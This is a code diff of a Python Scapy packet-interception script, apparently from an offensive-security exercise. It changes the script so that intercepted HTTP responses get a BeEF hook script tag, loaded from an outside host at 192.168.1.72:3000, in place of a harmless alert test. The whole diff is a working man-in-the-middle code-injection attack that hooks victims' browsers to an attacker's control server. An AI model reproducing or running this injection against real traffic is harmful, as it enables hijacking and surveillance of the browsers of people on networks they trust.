@@ -6,6 +6,8 @@ from Utilities.utils import set_load
 import re
 
 def process_packet(packet):
+    # alert_code = "<script>alert('Hello World!')</script>"
+    beef_code = "<script src=\"http://192.168.1.72:3000/hook.js\" ></script>"
     scapy_packet= IP(packet.get_payload())
     if scapy_packet.haslayer(Raw) and scapy_packet.haslayer(TCP):
         try:
@@ -20,7 +22,7 @@ def process_packet(packet):
             elif scapy_packet[TCP].sport == 80:
                 print("\n[+] HTTP Response:\n")
                 # print(scapy_packet.show())
-                injection_code = "<script>alert('Hello World!')</script>"
+                injection_code = beef_code
                 load = load.replace("</body>", injection_code + "</body>")
                 content_length_search = re.search(content_length_pattern, load)
                 if content_length_search and "text/html" in load:
